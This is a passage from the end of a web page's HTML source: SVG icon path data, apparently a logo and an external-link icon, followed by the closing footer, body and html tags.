61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>